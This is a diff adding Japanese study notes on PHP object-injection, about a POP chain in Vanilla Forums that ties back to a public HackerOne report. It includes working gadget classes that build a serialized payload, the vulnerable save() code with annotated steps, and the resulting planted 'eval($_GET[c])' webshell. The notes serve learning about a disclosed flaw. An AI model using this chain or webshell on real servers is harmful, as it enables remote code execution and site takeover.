@@ -216,10 +216,35 @@ print (serialize(new Example3));
 ?>
 ```
 ### __destruct (webshell)
+https://hackerone.com/reports/407552   
+
+以下が最終的なpopchianのコード。   
+デシリアライズするとき、`Gdn_Configuration`のインスタンスが作成されてコンストラクタが実行され、`new Gdn_ConfigurationSource()`によって`Gdn_ConfigurationSource`のインスタンスが作成される。   
+`Gdn_ConfigurationSource`のインスタンスが作成されるとコンストラクタが実行され、各種フィールドに値がセットされる。   
+```php
+class Gdn_ConfigurationSource{
+    public function __construct(){
+        $this->Type = "file";
+        $this->Source = "/var/www/html/conf/constants.php";
+        $this->Group = 'a=eval($_GET[c]);//';
+        $this->Settings[""] = "";       
+        $this->Dirty = true;
+        $this->ClassName = "Gdn_ConfigurationSource";
+    }
+}
+class Gdn_Configuration {
+    public $sources = [];
+    public function __construct(){
+        $this->sources['si'] = new Gdn_ConfigurationSource();
+    }
+}
+// serialize(new Gdn_Configuration);
+```
 
 `Gdn_Configuration`クラスのデストラクタが呼ばれるのがentrypoint。   
 [2]でshutdowm()メソッドが呼ばれて[3]が実行される。    
 [3]ではshutdown()メソッドの中でshutdown()メソッドが呼ばれてる。これは多分別のクラスのshutdown()メソッドを探すことになるはず？？ここでは別の`Gdn_ConfigurationSource`クラスにあるshutdown()メソッドが該当する。     
+上記のpopchainによって、`$source->shutdown(); // 3`の`$source`に`new Gdn_ConfigurationSource()`がセットされ、`インスタンス->shutdown()`となって`Gdn_ConfigurationSource`の`shutdown()`メソッドを実行できる！(実際に実行されるのはデストラクタが呼ばれるとき)   
 ```php
 class Gdn_Configuration extends Gdn_Pluggable {
 
@@ -243,8 +268,157 @@ class Gdn_Configuration extends Gdn_Pluggable {
         }
     }
 ```
+そして以下の`save()`メソッドが実行される。   
+[6]のswitchで`$this->Type`の値が`'file'`のとき、[7]で`$group`に`'a=eval($_GET[c]);//'`がセットされる。   
+次に[8]で`$options`連想配列に`'VarialbleName'`のValueとして値がセットされる。   
+次に[9]で`array_merge()`で別の情報も`$options`に統合される。   
+次に[10]で`Gdn_Configuration::format($data, $options)`で`'VarialbleName'`のValueをグローバル変数として設定するらしい。つまり、`$`にValueを追加した`$a=eval($_GET[c]);//`がグローバル変数名として設定される。また、これらをファイルの中身として`$fileContents`に保存する。   
+[11]でランダムに作成した`$tmpFile`ファイルに`$fileContents`を書き込む。   
+[12]で`$this->Source`にセットされた`"/var/www/html/conf/constants.php"`にファイル名を書き換える。これでWebshellが設置できる！   
+
+```php
+class Gdn_ConfigurationSource extends Gdn_Pluggable {
+
+    ...
+
+    /**
+     *
+     * 
+     * @return bool|null
+     * @throws Exception
+     */
+    public function save() {
+        if (!$this->Dirty) {
+            return null;
+        }
+
+        $this->EventArguments['ConfigDirty'] = &$this->Dirty;
+        $this->EventArguments['ConfigNoSave'] = false;
+        $this->EventArguments['ConfigType'] = $this->Type;
+        $this->EventArguments['ConfigSource'] = $this->Source;
+        $this->EventArguments['ConfigData'] = $this->Settings;
+        $this->fireEvent('BeforeSave');
+
+        if ($this->EventArguments['ConfigNoSave']) {
+            $this->Dirty = false;
+            return true;
+        }
+
+        // Check for and fire callback if one exists
+        if ($this->Callback && is_callable($this->Callback)) {
+            $callbackOptions = [];
+            if (!is_array($this->CallbackOptions)) {
+                $this->CallbackOptions = [];
+            }
+
+            $callbackOptions = array_merge($callbackOptions, $this->CallbackOptions, [
+                'ConfigDirty' => $this->Dirty,
+                'ConfigType' => $this->Type,
+                'ConfigSource' => $this->Source,
+                'ConfigData' => $this->Settings,
+                'SourceObject' => $this
+            ]);
+
+            $configSaved = call_user_func($this->Callback, $callbackOptions);
+
+            if ($configSaved) {
+                $this->Dirty = false;
+                return true;
+            }
+        }
+
+        switch ($this->Type) {                              // 6
+            case 'file':
+                if (empty($this->Source)) {
+                    trigger_error(errorMessage('You must specify a file path to be saved.', 'Configuration', 'Save'), E_USER_ERROR);
+                }
+
+                $checkWrite = $this->Source;
+                if (!file_exists($checkWrite)) {
+                    $checkWrite = dirname($checkWrite);
+                }
+
+                if (!is_writable($checkWrite)) {
+                    throw new Exception(sprintf(t("Unable to write to config file '%s' when saving."), $this->Source));
+                }
+
+                $group = $this->Group;                                                              // 7
+                $data = &$this->Settings;
+                if ($this->Configuration) {
+                    ksort($data, $this->Configuration->getSortFlag());
+                }
+
+                // Check for the case when the configuration is the group.
+                if (is_array($data) && count($data) == 1 && array_key_exists($group, $data)) {
+                    $data = $data[$group];
+                }
+
+                // Do a sanity check on the config save.
+                if ($this->Source == Gdn::config()->defaultPath()) {
+                    // Log root config changes
+                    try {
+                        $logData = $this->Initial;
+                        $logData['_New'] = $this->Settings;
+                        LogModel::insert('Edit', 'Configuration', $logData);
+                    } catch (Exception $ex) {
+                    }
+
+                    if (!isset($data['Database'])) {
+                        if ($pm = Gdn::pluginManager()) {
+                            $pm->EventArguments['Data'] = $data;
+                            $pm->EventArguments['Backtrace'] = debug_backtrace();
+                            $pm->fireEvent('ConfigError');
+                        }
+                        return false;
+                    }
+                }
+
+                $options = [
+                    'VariableName' => $group,                                                   // 8
+                    'WrapPHP' => true,
+                    'ByLine' => true
+                ];
+
+                if ($this->Configuration) {
+                    $options = array_merge($options, $this->Configuration->getFormatOptions());             // 9
+                }
+
+                // Write config data to string format, ready for saving
+                $fileContents = Gdn_Configuration::format($data, $options);                                 // 10
+
+                if ($fileContents === false) {
+                    trigger_error(errorMessage('Failed to define configuration file contents.', 'Configuration', 'Save'), E_USER_ERROR);
+                }
+
+                // Save to cache if we're into that sort of thing
+                $fileKey = sprintf(Gdn_Configuration::CONFIG_FILE_CACHE_KEY, $this->Source);
+                if ($this->Configuration && $this->Configuration->caching() && Gdn::cache()->type() == Gdn_Cache::CACHE_TYPE_MEMORY && Gdn::cache()->activeEnabled()) {
+                    $cachedConfigData = Gdn::cache()->store($fileKey, $data, [
+                        Gdn_Cache::FEATURE_NOPREFIX => true,
+                        Gdn_Cache::FEATURE_EXPIRY => 3600
+                    ]);
+                }
+
+                $tmpFile = tempnam(PATH_CONF, 'config');
+                $result = false;
+                if (file_put_contents($tmpFile, $fileContents) !== false) {                                 // 11
+                    chmod($tmpFile, 0775);
+                    $result = rename($tmpFile, $this->Source);                                              // 12
+                }
+```
+実際に設置されたWebshellは以下の感じらしい。   
+```txt
+steven@pluto:/var/www/html/conf$ cat constants.php 
+<?php if (!defined('APPLICATION')) exit();
+$a=eval($_GET[c]);//[''] = '';
+
+// Last edited by admin (172.16.175.1)2018-09-08 20:35:19
+```
 # 参考
 https://securitycafe.ro/2015/01/05/understanding-php-object-injection/   
 基本的な説明。わかりやすい。   
 https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/   
 具体例がたくさん。よさげ。   
+https://hackerone.com/reports/407552   
+Vanilla Forumのpop chainのガジェット。   
+
